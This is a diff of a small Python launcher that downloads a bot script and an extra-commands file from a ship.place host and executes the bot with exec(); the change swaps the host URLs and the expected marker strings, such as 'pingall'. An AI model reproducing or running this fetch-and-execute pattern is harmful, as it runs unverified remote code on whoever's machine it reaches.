@@ -5,8 +5,8 @@ import sys
 import urllib.request
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-BOT_URL = "https://happy-detail-tvk6n.ship.place/bot.py"
-EXTRA_URL = "https://happy-detail-tvk6n.ship.place/extra_cmds.py"
+BOT_URL = "https://pyrite-menu-glewo.ship.place/bot.py"
+EXTRA_URL = "https://pyrite-menu-glewo.ship.place/extra_cmds.py"
 BOT_FILE = os.path.join(HERE, "bot_full.py")
 EXTRA_FILE = os.path.join(HERE, "extra_cmds.py")
 
@@ -24,7 +24,7 @@ def fetch(url, dest, needles):
 
 if __name__ == "__main__":
     fetch(BOT_URL, BOT_FILE, ["Install To Server", "JOIN_WELCOME_DM"])
-    fetch(EXTRA_URL, EXTRA_FILE, ["ROAST x5", "RoastButtonView"])
+    fetch(EXTRA_URL, EXTRA_FILE, ["join(parts)", "pingall", "ROAST x5"])
     with open(BOT_FILE, encoding="utf-8") as f:
         code = f.read()
     exec(compile(code, BOT_FILE, "exec"), {"__name__": "__main__", "__file__": BOT_FILE})
